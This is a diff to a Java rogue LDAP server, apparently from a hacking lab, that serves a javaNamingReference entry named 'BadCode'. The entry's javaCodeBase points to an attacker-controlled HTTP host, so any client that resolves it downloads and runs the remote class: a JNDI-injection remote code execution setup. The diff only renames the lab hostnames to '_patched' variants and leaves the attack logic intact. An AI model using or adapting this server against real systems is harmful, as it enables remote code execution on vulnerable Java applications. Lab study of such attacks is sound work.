@@ -17,7 +17,7 @@ public class LDAPServer {
         InMemoryListenerConfig listenerConfig = new InMemoryListenerConfig(
                 "foo",
                 //InetAddress.getByName("0.0.0.0"),
-                InetAddress.getByName("hackerslabldap"),
+                InetAddress.getByName("hackerslabldap_patched"),
                 10389,
                 ServerSocketFactory.getDefault(),
                 SocketFactory.getDefault(),
@@ -43,7 +43,7 @@ public class LDAPServer {
             e.addAttribute("objectClass", "top", "domain", "extensibleObject", "javaNamingReference");
             e.addAttribute("cn", "badcode");
             e.addAttribute("javaClassName", "BadCode");
-            e.addAttribute("javaCodeBase", "http://hackerslabhttp:8082/");
+            e.addAttribute("javaCodeBase", "http://hackerslabhttp_patched:8082/");
             e.addAttribute("javaFactory", "BadCode");
             ds.add(e);
             
